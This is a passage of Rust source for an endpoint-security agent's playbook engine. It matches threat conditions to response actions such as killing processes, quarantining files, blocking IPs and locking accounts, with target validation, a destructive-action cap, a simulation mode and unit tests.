// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Playbook execution engine -- evaluates conditions and triggers response actions.
//!
//! This module evaluates playbook conditions against the current threat state
//! and executes the appropriate response chain. When the `llm` feature is
//! enabled, AI-powered confidence scoring enriches the evaluation.

#[cfg(feature = "llm")]
use tracing::debug;
use tracing::warn;

/// Playbook condition evaluation result.
#[derive(Debug)]
pub struct PlaybookEvaluation {
    pub playbook_id: String,
    pub playbook_name: String,
    pub triggered: bool,
    pub matched_conditions: Vec<String>,
    pub confidence: f32,
    pub actions: Vec<ResolvedAction>,
}

/// A resolved action to execute as part of a playbook.
#[derive(Debug, Clone)]
pub enum ResolvedAction {
    KillProcess {
        name: String,
        pid: u32,
    },
    QuarantineFile {
        path: String,
    },
    BlockIp {
        ip: String,
        duration_secs: u64,
    },
    Alert {
        title: String,
        severity: String,
        description: String,
    },
    Notify {
        message: String,
    },
    /// Cut the endpoint off the network (the platform stays reachable).
    /// `duration_secs` 0: until released.
    IsolateHost {
        duration_secs: u64,
    },
    /// Lock a local account. `duration_secs` 0: until an administrator
    /// unlocks it.
    DisableAccount {
        user: String,
        duration_secs: u64,
    },
    /// Run a response command declared in the agent's configuration, giving
    /// it `context` (what the playbook matched).
    RunCommand {
        name: String,
        context: serde_json::Value,
    },
}

/// An account lock lasts this long when the playbook action gives no duration.
pub const DEFAULT_ACCOUNT_LOCK_SECS: u64 = 3600;

/// Duration of a "lock account" action, from its parameter (seconds; `0`:
/// until unlocked; blank or unreadable: [`DEFAULT_ACCOUNT_LOCK_SECS`]).
pub fn account_lock_duration(parameters: &str) -> u64 {
    parameters
        .trim()
        .parse::<u64>()
        .unwrap_or(DEFAULT_ACCOUNT_LOCK_SECS)
}

/// Isolation lasts this long when the playbook action gives no duration.
pub const DEFAULT_ISOLATION_SECS: u64 = 3600;

/// Duration of an "isolate host" action, from its parameter (seconds; `0`:
/// until released; blank or unreadable: [`DEFAULT_ISOLATION_SECS`]).
pub fn isolation_duration(parameters: &str) -> u64 {
    parameters
        .trim()
        .parse::<u64>()
        .unwrap_or(DEFAULT_ISOLATION_SECS)
}

/// Result of a single playbook action execution.
#[derive(Debug)]
pub struct ActionResult {
    pub action: String,
    pub success: bool,
    pub error: Option<String>,
}

/// Threat context for playbook evaluation.
///
/// Populated from the agent's security scan results, network alerts, and FIM
/// alerts so the playbook engine can check conditions against live data.
#[derive(Debug, Default)]
pub struct ThreatContext {
    pub suspicious_processes: Vec<ProcessInfo>,
    pub network_alerts: Vec<NetworkAlertInfo>,
    pub fim_alerts: Vec<FimAlertInfo>,
}

#[derive(Debug, Clone)]
pub struct ProcessInfo {
    pub name: String,
    pub pid: u32,
    pub command_line: String,
}

#[derive(Debug, Clone)]
pub struct NetworkAlertInfo {
    pub remote_ip: Option<String>,
    pub port: Option<u16>,
    pub severity: String,
    pub description: String,
    /// The account the alert is about, when it names one (a session opened
    /// after a brute force names the account that was taken).
    pub user: Option<String>,
}

#[derive(Debug, Clone)]
pub struct FimAlertInfo {
    pub path: String,
    pub change_type: String,
}

/// Evaluate playbook conditions against the current threat context.
///
/// This function checks each enabled playbook's conditions against:
/// - Suspicious processes detected by the security scanner
/// - Network security alerts
/// - FIM alerts
///
/// When the `llm` feature is enabled and a service is available, AI confidence
/// annotations enrich the analysis without changing the deterministic verdict.
pub async fn evaluate_playbook(
    playbook: &agent_gui::dto::Playbook,
    threat_context: &ThreatContext,
    #[cfg(feature = "llm")] llm_service: Option<&crate::llm_service::LLMService>,
) -> PlaybookEvaluation {
    use agent_gui::dto::PlaybookConditionType;

    let mut matched_conditions = Vec::new();
    let mut actions = Vec::new();
    let mut base_confidence: f32 = 0.0;
    // Number of *conditions* that matched, as opposed to the number of matched
    // entities recorded in `matched_conditions` (one condition can match many
    // processes). The "all" operator must count conditions, not entities.
    let mut conditions_matched = 0usize;

    if !playbook.enabled {
        return PlaybookEvaluation {
            playbook_id: playbook.id.to_string(),
            playbook_name: playbook.name.clone(),
            triggered: false,
            matched_conditions: vec![],
            confidence: 0.0,
            actions: vec![],
        };
    }

    // Evaluate each condition
    for condition in &playbook.conditions {
        let condition_value = condition.value.to_lowercase();

        // Guard against blank match patterns. Substring matching with an empty
        // value (`haystack.contains("")`) is always true, so a playbook with a
        // blank condition would match *every* process / file / alert and emit a
        // destructive action (kill, quarantine, block) for each. Skip such a
        // condition rather than let a misconfigured rule fan out mass actions.
        // CvssScore is numeric and unaffected by this.
        if condition_value.trim().is_empty()
            && !matches!(condition.condition_type, PlaybookConditionType::CvssScore)
        {
            warn!(
                "Skipping playbook '{}' condition with empty value (type {:?}) to avoid matching all entities",
                playbook.name, condition.condition_type
            );
            continue;
        }

        let matches_before = matched_conditions.len();

        match condition.condition_type {
            PlaybookConditionType::ProcessNameMatch => {
                for process in &threat_context.suspicious_processes {
                    if process.name.to_lowercase().contains(&condition_value) {
                        matched_conditions.push(format!(
                            "Process '{}' matches '{}'",
                            process.name, condition.value
                        ));
                        actions.push(ResolvedAction::KillProcess {
                            name: process.name.clone(),
                            pid: process.pid,
                        });
                        base_confidence += 0.3;
                    }
                }
            }
            PlaybookConditionType::NetworkAlertType => {
                for alert in &threat_context.network_alerts {
                    if alert.description.to_lowercase().contains(&condition_value)
                        || alert.severity.to_lowercase() == condition_value
                    {
                        matched_conditions
                            .push(format!("Network alert matches '{}'", condition.value));
                        if let Some(ref ip) = alert.remote_ip {
                            actions.push(ResolvedAction::BlockIp {
                                ip: ip.clone(),
                                duration_secs: 3600,
                            });
                        }
                        if let Some(ref user) = alert.user {
                            actions.push(ResolvedAction::DisableAccount {
                                user: user.clone(),
                                duration_secs: DEFAULT_ACCOUNT_LOCK_SECS,
                            });
                        }
                        base_confidence += 0.3;
                    }
                }
            }
            PlaybookConditionType::FimChange => {
                for fim_alert in &threat_context.fim_alerts {
                    if fim_alert.path.to_lowercase().contains(&condition_value)
                        || fim_alert.change_type.to_lowercase() == condition_value
                    {
                        matched_conditions
                            .push(format!("FIM alert on path matching '{}'", condition.value));
                        actions.push(ResolvedAction::QuarantineFile {
                            path: fim_alert.path.clone(),
                        });
                        base_confidence += 0.3;
                    }
                }
            }
            PlaybookConditionType::SeverityThreshold => {
                for alert in &threat_context.network_alerts {
                    if matches!((severity_rank(&alert.severity), severity_rank(&condition_value)), (Some(actual), Some(threshold)) if actual >= threshold)
                    {
                        matched_conditions
                            .push(format!("Severity '{}' matches threshold", condition.value));
                        base_confidence += 0.2;
                    }
                }
            }
            PlaybookConditionType::CvssScore => {
                // Network severity does not provide a vulnerability CVSS score.
                // Do not fabricate one and trigger an action from unrelated evidence.
                warn!(
                    "Playbook '{}' CVSS condition cannot be evaluated without CVSS evidence",
                    playbook.name
                );
            }
        }

        if matched_conditions.len() > matches_before {
            conditions_matched += 1;
        }
    }

    // Use the first condition's operator to determine AND/OR logic.
    // Default to "any" (OR) if no operator is set.
    let operator = playbook
        .conditions
        .first()
        .map(|c| c.operator.as_str())
        .unwrap_or("any");

    let actually_triggered =
        playbook_triggers(operator, conditions_matched, playbook.conditions.len());

    // Matching a condition identifies candidate targets; only configured actions
    // authorize changing those targets. A notification-only console playbook
    // must never terminate a matching process or quarantine a matching file.
    actions.retain(|candidate| {
        actually_triggered
            && playbook.actions.iter().any(|configured| {
                use agent_gui::dto::PlaybookActionType;
                matches!(
                    (candidate, configured.action_type),
                    (
                        ResolvedAction::KillProcess { .. },
                        PlaybookActionType::KillProcess
                    ) | (
                        ResolvedAction::QuarantineFile { .. },
                        PlaybookActionType::QuarantineFile
                    ) | (ResolvedAction::BlockIp { .. }, PlaybookActionType::BlockIp)
                        | (
                            ResolvedAction::DisableAccount { .. },
                            PlaybookActionType::DisableAccount
                        )
                )
            })
    });
    // The same account named by several alerts is locked once, for the time
    // the playbook asks.
    let lock_secs = playbook
        .actions
        .iter()
        .find(|configured| {
            configured.action_type == agent_gui::dto::PlaybookActionType::DisableAccount
        })
        .map(|configured| account_lock_duration(&configured.parameters));
    let mut locked: Vec<String> = Vec::new();
    actions.retain_mut(|action| match action {
        ResolvedAction::DisableAccount {
            user,
            duration_secs,
        } => {
            *duration_secs = lock_secs.unwrap_or(DEFAULT_ACCOUNT_LOCK_SECS);
            let first = !locked.contains(user);
            locked.push(user.clone());
            first
        }
        _ => true,
    });
    if actually_triggered {
        for configured in &playbook.actions {
            match configured.action_type {
                agent_gui::dto::PlaybookActionType::CreateNotification => {
                    actions.push(ResolvedAction::Notify {
                        message: configured.parameters.clone(),
                    })
                }
                agent_gui::dto::PlaybookActionType::IsolateHost => {
                    actions.push(ResolvedAction::IsolateHost {
                        duration_secs: isolation_duration(&configured.parameters),
                    })
                }
                agent_gui::dto::PlaybookActionType::RunCommand => {
                    // What the playbook matched, for the organisation's
                    // program to act on. Built from the targets kept above.
                    let mut targets = serde_json::json!({
                        "processes": [], "files": [], "addresses": [], "accounts": [],
                    });
                    for action in &actions {
                        let (kind, value) = match action {
                            ResolvedAction::KillProcess { name, pid } => {
                                ("processes", serde_json::json!({ "name": name, "pid": pid }))
                            }
                            ResolvedAction::QuarantineFile { path } => {
                                ("files", serde_json::json!(path))
                            }
                            ResolvedAction::BlockIp { ip, .. } => {
                                ("addresses", serde_json::json!(ip))
                            }
                            ResolvedAction::DisableAccount { user, .. } => {
                                ("accounts", serde_json::json!(user))
                            }
                            _ => continue,
                        };
                        if let Some(list) = targets[kind].as_array_mut() {
                            list.push(value);
                        }
                    }
                    actions.push(ResolvedAction::RunCommand {
                        name: configured.parameters.trim().to_string(),
                        context: serde_json::json!({
                            "playbook": playbook.name,
                            "matched_conditions": matched_conditions,
                            "targets": targets,
                        }),
                    })
                }
                agent_gui::dto::PlaybookActionType::SendSiemAlert => {
                    actions.push(ResolvedAction::Alert {
                        title: format!("Playbook '{}' triggered", playbook.name),
                        severity: "medium".to_string(),
                        description: format!(
                            "Conditions matched: {}",
                            matched_conditions.join(", ")
                        ),
                    })
                }
                _ => {}
            }
        }

        // Add an AI annotation when available; keep the deterministic verdict.
        #[cfg(feature = "llm")]
        {
            if let Some(svc) = llm_service
                && svc.is_available().await
                && let Some(manager) = svc.get_manager().await
            {
                let event_desc = format!(
                    "Playbook '{}' triggered. Conditions: {}. Context: {} suspicious processes, {} network alerts, {} FIM alerts.",
                    playbook.name,
                    matched_conditions.join("; "),
                    threat_context.suspicious_processes.len(),
                    threat_context.network_alerts.len(),
                    threat_context.fim_alerts.len(),
                );
                let event = agent_llm::SecurityEvent {
                    id: uuid::Uuid::new_v4().to_string(),
                    event_type: "playbook_trigger".to_string(),
                    description: event_desc,
                    system_info: std::env::consts::OS.to_string(),
                    historical_context: String::new(),
                    timestamp: chrono::Utc::now(),
                    source: "playbook_engine".to_string(),
                    severity: "medium".to_string(),
                    raw_data: serde_json::json!({ "matched_conditions": matched_conditions }),
                };

                match manager.classifier().classify_event(&event).await {
                    Ok(classification) => {
                        // AI annotations must not authorize or suppress deterministic actions.
                        debug!(
                            "Playbook AI annotation: {:?}, confidence {}%",
                            classification.threat_type, classification.confidence
                        );
                    }
                    Err(e) => {
                        debug!("LLM classification for playbook failed: {}", e);
                    }
                }
            }
        }
    }

    let confidence = base_confidence.clamp(0.0, 1.0);

    PlaybookEvaluation {
        playbook_id: playbook.id.to_string(),
        playbook_name: playbook.name.clone(),
        triggered: actually_triggered,
        matched_conditions,
        confidence,
        actions,
    }
}

fn severity_rank(value: &str) -> Option<u8> {
    match value.trim().to_ascii_lowercase().as_str() {
        "info" => Some(0),
        "low" => Some(1),
        "medium" => Some(2),
        "high" => Some(3),
        "critical" => Some(4),
        _ => None,
    }
}

/// Decide whether a playbook fires, given how many of its conditions matched.
///
/// `conditions_matched` counts distinct *conditions*, not matched entities: one
/// `ProcessNameMatch` condition can match many processes. Conflating the two is
/// what made a two-condition "all" playbook fire on a single condition that
/// happened to hit two processes, quietly turning a narrow rule into a
/// disjunctive one.
#[allow(dead_code)]
fn playbook_triggers(operator: &str, conditions_matched: usize, total_conditions: usize) -> bool {
    match operator {
        "all" | "and" | "AND" => total_conditions > 0 && conditions_matched >= total_conditions,
        // "any" / "or" -- at least one condition matched.
        _ => conditions_matched > 0,
    }
}

/// Maximum destructive actions a single playbook run may execute.
///
/// Conditions match by substring against live scan results, so one
/// over-broad pattern can fan out to every process or file on the host. This
/// caps the blast radius of a misconfigured or malicious playbook; the actions
/// beyond the cap are refused and logged rather than silently dropped.
const MAX_DESTRUCTIVE_ACTIONS_PER_RUN: usize = 10;

/// Whether an action changes host state irreversibly enough to be worth capping.
fn is_destructive(action: &ResolvedAction) -> bool {
    matches!(
        action,
        ResolvedAction::KillProcess { .. }
            | ResolvedAction::QuarantineFile { .. }
            | ResolvedAction::BlockIp { .. }
            | ResolvedAction::IsolateHost { .. }
            | ResolvedAction::DisableAccount { .. }
            | ResolvedAction::RunCommand { .. }
    )
}

/// Reject action targets that are structurally invalid before they reach the
/// EDR layer.
///
/// `edr_actions` enforces the self-protection invariants (own PID, own files,
/// backend IP) and remains the authoritative chokepoint. This is the
/// playbook-specific layer: playbooks are authored on the platform and stored
/// locally verbatim, and the manual-trigger path in `main.rs` passes their
/// parameters through without evaluating any condition, so targets arriving
/// here are attacker-influenceable strings rather than scanner-derived values.
fn validate_target(action: &ResolvedAction) -> Result<(), String> {
    match action {
        ResolvedAction::KillProcess { pid, name } => {
            if *pid == 0 || *pid == 1 {
                return Err(format!("refusing reserved PID {} (target '{}')", pid, name));
            }
            Ok(())
        }
        ResolvedAction::QuarantineFile { path } => {
            if path.trim().is_empty() {
                return Err("refusing empty quarantine path".to_string());
            }
            if !std::path::Path::new(path).is_absolute() {
                return Err(format!(
                    "refusing relative quarantine path '{}': target is ambiguous \
                     and depends on the agent's working directory",
                    path
                ));
            }
            Ok(())
        }
        ResolvedAction::BlockIp { ip, .. } => {
            if ip.parse::<std::net::IpAddr>().is_err() {
                return Err(format!("refusing malformed IP '{}'", ip));
            }
            Ok(())
        }
        ResolvedAction::DisableAccount { user, .. } => {
            // Which account may be locked is decided where it is locked;
            // here only what cannot be an account name is turned away.
            let named = !user.is_empty()
                && user.len() <= 64
                && !user.starts_with('-')
                && user
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
            if named {
                Ok(())
            } else {
                Err(format!("refusing '{}': not an account name", user))
            }
        }
        ResolvedAction::RunCommand { name, .. } => {
            if crate::edr_actions::response_command::is_command_name(name) {
                Ok(())
            } else {
                Err(format!(
                    "refusing '{}': a playbook names a response command, it does not carry one",
                    name
                ))
            }
        }
        _ => Ok(()),
    }
}

/// How an action reads in results, logs and the audit trail.
fn describe(action: &ResolvedAction) -> String {
    match action {
        ResolvedAction::KillProcess { name, pid } => {
            format!("Kill process {} (PID {})", name, pid)
        }
        ResolvedAction::QuarantineFile { path } => format!("Quarantine {}", path),
        ResolvedAction::BlockIp { ip, .. } => format!("Block IP {}", ip),
        ResolvedAction::IsolateHost { duration_secs: 0 } => {
            "Isolate host until released".to_string()
        }
        ResolvedAction::IsolateHost { duration_secs } => {
            format!("Isolate host for {}s", duration_secs)
        }
        ResolvedAction::DisableAccount {
            user,
            duration_secs: 0,
        } => format!("Lock account {} until unlocked", user),
        ResolvedAction::DisableAccount {
            user,
            duration_secs,
        } => format!("Lock account {} for {}s", user, duration_secs),
        ResolvedAction::RunCommand { name, .. } => format!("Run response command '{}'", name),
        ResolvedAction::Alert { title, .. } => format!("Alert: {}", title),
        ResolvedAction::Notify { message } => format!("Notify: {}", message),
    }
}

/// Marks, in results and logs, an action that was simulated and not run.
pub const SIMULATION_PREFIX: &str = "[Simulation] ";

/// Execute playbook actions and collect results.
pub async fn execute_playbook_actions(
    playbook_name: &str,
    actions: &[ResolvedAction],
    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
) -> Vec<ActionResult> {
    execute_playbook_actions_with_delivery(playbook_name, actions, audit_trail, None, None).await
}

/// Execute actions with explicit delivery destinations. Without a destination,
/// notification/SIEM actions fail instead of claiming success after logging only.
pub async fn execute_playbook_actions_with_delivery(
    playbook_name: &str,
    actions: &[ResolvedAction],
    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
    notifications: Option<&std::sync::mpsc::Sender<agent_gui::events::AgentEvent>>,
    siem: Option<&agent_siem::SiemForwarder>,
) -> Vec<ActionResult> {
    run_playbook_actions(
        playbook_name,
        actions,
        audit_trail,
        notifications,
        siem,
        false,
    )
    .await
}

/// Record what the actions would do, without doing any of it: nothing is
/// killed, quarantined, blocked, isolated, notified or sent to the SIEM.
///
/// Targets are checked and the destructive-action limit applies exactly as
/// in a real run, so the result also shows which actions would be refused.
/// Each simulated action is labelled with [`SIMULATION_PREFIX`].
pub async fn simulate_playbook_actions(
    playbook_name: &str,
    actions: &[ResolvedAction],
    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
) -> Vec<ActionResult> {
    run_playbook_actions(playbook_name, actions, audit_trail, None, None, true).await
}

async fn run_playbook_actions(
    playbook_name: &str,
    actions: &[ResolvedAction],
    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
    notifications: Option<&std::sync::mpsc::Sender<agent_gui::events::AgentEvent>>,
    siem: Option<&agent_siem::SiemForwarder>,
    simulate: bool,
) -> Vec<ActionResult> {
    let mut results = Vec::new();
    let mut destructive_executed = 0usize;

    for action in actions {
        if let Err(reason) = validate_target(action) {
            warn!(
                "Playbook '{}': rejected action -- {}",
                playbook_name, reason
            );
            results.push(ActionResult {
                action: format!("{:?}", action),
                success: false,
                error: Some(format!("Rejected by target validation: {}", reason)),
            });
            continue;
        }

        if is_destructive(action) {
            destructive_executed += 1;
            if destructive_executed > MAX_DESTRUCTIVE_ACTIONS_PER_RUN {
                warn!(
                    "Playbook '{}': destructive action cap ({}) reached, refusing remaining actions",
                    playbook_name, MAX_DESTRUCTIVE_ACTIONS_PER_RUN
                );
                results.push(ActionResult {
                    action: format!("{:?}", action),
                    success: false,
                    error: Some(format!(
                        "Refused: playbook exceeded the {} destructive-action limit for a single run",
                        MAX_DESTRUCTIVE_ACTIONS_PER_RUN
                    )),
                });
                continue;
            }
        }

        let label = describe(action);
        let outcome: Result<(), String> = if simulate {
            Ok(())
        } else {
            match action {
                ResolvedAction::KillProcess { name, pid } => {
                    crate::edr_actions::kill_process(name, *pid)
                        .await
                        .map_err(|e| e.to_string())
                }
                ResolvedAction::QuarantineFile { path } => {
                    crate::edr_actions::quarantine_file(path)
                        .await
                        .map(drop)
                        .map_err(|e| e.to_string())
                }
                ResolvedAction::BlockIp { ip, duration_secs } => {
                    crate::edr_actions::block_ip(ip, *duration_secs)
                        .await
                        .map_err(|e| e.to_string())
                }
                ResolvedAction::IsolateHost { duration_secs } => {
                    let reason = format!("Playbook '{}'", playbook_name);
                    crate::host_isolation::isolate_host(&reason, *duration_secs)
                        .await
                        .map(drop)
                        .map_err(|e| e.to_string())
                }
                ResolvedAction::DisableAccount {
                    user,
                    duration_secs,
                } => crate::edr_actions::account::disable_account(user, *duration_secs)
                    .await
                    .map_err(|e| e.to_string()),
                ResolvedAction::RunCommand { name, context } => {
                    crate::edr_actions::response_command::run_response_command(name, context)
                        .await
                        .map_err(|e| e.to_string())
                }
                ResolvedAction::Alert {
                    title,
                    severity,
                    description,
                } => {
                    if let Some(forwarder) = siem {
                        let event = agent_siem::SiemEvent {
                            timestamp: chrono::Utc::now(),
                            severity: severity_rank(severity).unwrap_or(2) * 2 + 1,
                            category: agent_siem::EventCategory::Security,
                            name: title.clone(),
                            description: description.clone(),
                            source_host: hostname::get()
                                .map(|h| h.to_string_lossy().into_owned())
                                .unwrap_or_default(),
                            source_ip: None,
                            destination_ip: None,
                            destination_port: None,
                            user: None,
                            process_name: None,
                            process_id: None,
                            file_path: None,
                            custom_fields: serde_json::json!({"playbook":playbook_name}),
                            event_id: uuid::Uuid::new_v4().to_string(),
                            agent_version: agent_common::constants::AGENT_VERSION.to_string(),
                        };
                        forwarder
                            .send_required_event(&event)
                            .await
                            .map_err(|e| e.to_string())
                    } else {
                        Err("No SIEM delivery destination configured".to_string())
                    }
                }
                ResolvedAction::Notify { message } => {
                    if let Some(tx) = notifications {
                        tx.send(agent_gui::events::AgentEvent::Notification {
                            notification: agent_gui::dto::GuiNotification::info(
                                playbook_name,
                                message.clone(),
                            ),
                        })
                        .map_err(|e| e.to_string())
                    } else {
                        Err("No notification delivery destination configured".to_string())
                    }
                }
            }
        };

        let result = ActionResult {
            action: if simulate {
                format!("{SIMULATION_PREFIX}{label}")
            } else {
                label
            },
            success: outcome.is_ok(),
            error: outcome.err(),
        };

        if let Some(trail) = audit_trail {
            trail
                .log(
                    crate::audit_trail::AuditAction::PlaybookActionExecuted {
                        playbook_name: playbook_name.to_string(),
                        action: result.action.clone(),
                        success: result.success,
                    },
                    "system",
                    result.error.clone(),
                )
                .await;
        }

        results.push(result);
    }

    results
}

#[cfg(test)]
mod guard_tests {
    use super::*;

    /// The regression this guards: `conditions_matched` counts conditions, not
    /// matched entities. Passing 2 here stands for "one condition matched two
    /// processes" -- which must NOT satisfy a two-condition AND.
    #[test]
    fn all_operator_requires_every_condition_to_match() {
        for op in ["all", "and", "AND"] {
            assert!(
                !playbook_triggers(op, 1, 2),
                "'{}' must not fire with 1 of 2 conditions matched",
                op
            );
            assert!(
                playbook_triggers(op, 2, 2),
                "'{}' must fire when both conditions matched",
                op
            );
            // An empty condition list must never fire: 0 >= 0 would otherwise
            // make a playbook with no conditions trigger unconditionally.
            assert!(
                !playbook_triggers(op, 0, 0),
                "'{}' must not fire with no conditions defined",
                op
            );
        }
    }

    #[test]
    fn any_operator_fires_on_a_single_match() {
        for op in ["any", "or", "", "unrecognized"] {
            assert!(playbook_triggers(op, 1, 3), "'{}' should fire on one", op);
            assert!(!playbook_triggers(op, 0, 3), "'{}' needs a match", op);
        }
    }

    #[test]
    fn rejects_reserved_pids() {
        for pid in [0u32, 1u32] {
            let action = ResolvedAction::KillProcess {
                name: "x".to_string(),
                pid,
            };
            assert!(
                validate_target(&action).is_err(),
                "PID {} must be rejected",
                pid
            );
        }
        assert!(
            validate_target(&ResolvedAction::KillProcess {
                name: "x".to_string(),
                pid: 4242,
            })
            .is_ok(),
            "an ordinary PID must still be allowed"
        );
    }

    #[test]
    fn rejects_ambiguous_and_malformed_targets() {
        assert!(
            validate_target(&ResolvedAction::QuarantineFile {
                path: "relative/path.bin".to_string(),
            })
            .is_err(),
            "relative quarantine paths depend on the working directory"
        );
        assert!(
            validate_target(&ResolvedAction::QuarantineFile {
                path: "   ".to_string(),
            })
            .is_err(),
            "blank quarantine path must be rejected"
        );
        assert!(
            validate_target(&ResolvedAction::BlockIp {
                ip: "not-an-ip".to_string(),
                duration_secs: 60,
            })
            .is_err(),
            "malformed IP must be rejected"
        );
        assert!(
            validate_target(&ResolvedAction::BlockIp {
                ip: "203.0.113.7".to_string(),
                duration_secs: 60,
            })
            .is_ok(),
            "a well-formed IP must still be allowed"
        );
    }

    #[test]
    fn non_destructive_actions_are_not_capped() {
        assert!(!is_destructive(&ResolvedAction::Notify {
            message: "x".to_string(),
        }));
        assert!(is_destructive(&ResolvedAction::QuarantineFile {
            path: "/tmp/x".to_string(),
        }));
    }

    /// Targets are absolute but non-existent, so every action fails harmlessly
    /// inside `quarantine_file` -- what is under test is the cap, not the EDR
    /// layer. Absolute for the system the tests run on: a path without a
    /// drive is relative on Windows, and refused before the cap is reached.
    #[tokio::test]
    async fn destructive_actions_are_capped_per_run() {
        let over_cap = MAX_DESTRUCTIVE_ACTIONS_PER_RUN + 3;
        let root = if cfg!(windows) { r"C:\" } else { "/" };
        let actions: Vec<ResolvedAction> = (0..over_cap)
            .map(|i| ResolvedAction::QuarantineFile {
                path: format!("{root}nonexistent-sentinel-cap-test-{i}"),
            })
            .collect();

        let results = execute_playbook_actions("cap-test", &actions, None).await;
        assert_eq!(results.len(), over_cap, "every action must be reported");

        let capped = results
            .iter()
            .filter(|r| {
                r.error
                    .as_deref()
                    .is_some_and(|e| e.contains("destructive-action limit"))
            })
            .count();
        assert_eq!(
            capped,
            over_cap - MAX_DESTRUCTIVE_ACTIONS_PER_RUN,
            "actions beyond the cap must be refused, and refusals must be reported rather than dropped"
        );
    }

    #[tokio::test]
    async fn invalid_targets_never_reach_the_edr_layer() {
        let actions = vec![
            ResolvedAction::KillProcess {
                name: "everything".to_string(),
                pid: 0,
            },
            ResolvedAction::BlockIp {
                ip: "bogus".to_string(),
                duration_secs: 0,
            },
        ];

        let results = execute_playbook_actions("invalid-test", &actions, None).await;
        assert_eq!(results.len(), 2);
        assert!(
            results.iter().all(|r| !r.success
                && r.error
                    .as_deref()
                    .is_some_and(|e| e.contains("target validation"))),
            "both actions must be rejected by validation, got {:?}",
            results
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use agent_gui::dto::{
        Playbook, PlaybookAction, PlaybookActionType, PlaybookCondition, PlaybookConditionType,
    };

    fn make_playbook(conditions: Vec<PlaybookCondition>) -> Playbook {
        Playbook {
            id: uuid::Uuid::new_v4().to_string(),
            name: "test".to_string(),
            description: String::new(),
            enabled: true,
            conditions,
            actions: vec![],
            created_at: chrono::Utc::now(),
            last_triggered: None,
            trigger_count: 0,
            is_template: false,
        }
    }

    #[tokio::test]
    async fn notifications_require_a_live_destination() {
        let actions = vec![ResolvedAction::Notify {
            message: "delivered".into(),
        }];
        let missing = execute_playbook_actions("test", &actions, None).await;
        assert!(!missing[0].success);
        let (tx, rx) = std::sync::mpsc::channel();
        let sent =
            execute_playbook_actions_with_delivery("test", &actions, None, Some(&tx), None).await;
        assert!(sent[0].success);
        assert!(
            matches!(rx.recv().unwrap(), agent_gui::events::AgentEvent::Notification { notification } if notification.body == "delivered")
        );
        drop(rx);
        let closed =
            execute_playbook_actions_with_delivery("test", &actions, None, Some(&tx), None).await;
        assert!(!closed[0].success);
    }

    #[tokio::test]
    async fn standalone_playbook_runs_without_detection_rules_or_rendering() {
        use agent_gui::dto::{PlaybookAction, PlaybookActionType};
        let mut pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::SeverityThreshold,
            operator: ">=".into(),
            value: "medium".into(),
        }]);
        pb.actions.push(PlaybookAction {
            action_type: PlaybookActionType::CreateNotification,
            parameters: "response".into(),
        });
        let ctx = ThreatContext {
            network_alerts: vec![NetworkAlertInfo {
                remote_ip: None,
                port: None,
                severity: "high".into(),
                description: "test".into(),
                user: None,
            }],
            ..Default::default()
        };
        let (tx, rx) = std::sync::mpsc::channel();
        let result = crate::threat_pipeline::run_threat_pipeline(
            &[],
            &[pb.clone()],
            &ctx,
            &crate::threat_pipeline::ObservedActivity::default(),
            &mut crate::threat_pipeline::RuleHitMemory::default(),
            &Some(tx),
            #[cfg(feature = "llm")]
            None,
            None,
            None,
            false,
        )
        .await;
        assert!(result.rule_matches.is_empty());
        assert_eq!(result.playbook_logs.len(), 1);
        assert!(result.playbook_logs[0].success);
        assert!(matches!(
            rx.recv().unwrap(),
            agent_gui::events::AgentEvent::Notification { .. }
        ));
        pb.conditions[0].value = "critical".into();
        assert!(!eval(&pb, &ctx).await.triggered);
        pb.conditions[0].condition_type = PlaybookConditionType::CvssScore;
        pb.conditions[0].value = "7".into();
        assert!(
            !eval(&pb, &ctx).await.triggered,
            "network severity is not CVSS evidence"
        );
    }

    fn proc(name: &str, pid: u32) -> ProcessInfo {
        ProcessInfo {
            name: name.to_string(),
            pid,
            command_line: String::new(),
        }
    }

    async fn eval(pb: &Playbook, ctx: &ThreatContext) -> PlaybookEvaluation {
        evaluate_playbook(
            pb,
            ctx,
            #[cfg(feature = "llm")]
            None,
        )
        .await
    }

    #[tokio::test]
    async fn empty_condition_value_does_not_match_all_processes() {
        let pb = make_playbook(vec![PlaybookCondition {
            condition_type: PlaybookConditionType::ProcessNameMatch,
            operator: "any".to_string(),
            value: "   ".to_string(),
        }]);
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("evil", 1234), proc("chrome", 5678)],
            ..Default::default()
        };
        let result = eval(&pb, &ctx).await;
        assert!(!result.triggered, "blank condition must not trigger");
        assert!(
            result.actions.is_empty(),
            "blank condition must not fan out kill actions, got {:?}",
            result.actions
        );
    }

    /// A two-condition "all" playbook must not fire when only one condition
    /// matched, however many entities that one condition hit. The previous
    /// implementation compared matched *entities* against condition count, so
    /// two matching processes satisfied a two-condition AND on their own --
    /// silently turning a deliberately narrow rule into a disjunctive one.
    #[tokio::test]
    async fn all_operator_counts_conditions_not_matched_entities() {
        let pb = make_playbook(vec![
            PlaybookCondition {
                condition_type: PlaybookConditionType::ProcessNameMatch,
                operator: "all".to_string(),
                value: "evil".to_string(),
            },
            PlaybookCondition {
                condition_type: PlaybookConditionType::NetworkAlertType,
                operator: "all".to_string(),
                value: "never-matches-anything".to_string(),
            },
        ]);
        // Two processes match the first condition; nothing matches the second.
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("evil_one", 111), proc("evil_two", 222)],
            ..Default::default()
        };

        let result = eval(&pb, &ctx).await;
        assert!(
            !result.triggered,
            "an AND playbook with one unmatched condition must not trigger"
        );
    }

    #[tokio::test]
    async fn all_operator_still_triggers_when_every_condition_matches() {
        let pb = make_playbook(vec![
            PlaybookCondition {
                condition_type: PlaybookConditionType::ProcessNameMatch,
                operator: "all".to_string(),
                value: "evil".to_string(),
            },
            PlaybookCondition {
                condition_type: PlaybookConditionType::FimChange,
                operator: "all".to_string(),
                value: "/etc/passwd".to_string(),
            },
        ]);
        let ctx = ThreatContext {
            suspicious_processes: vec![proc("evil_one", 111)],
            fim_alerts: vec![FimAlertInfo {
                path: "/etc/passwd".to_string(),
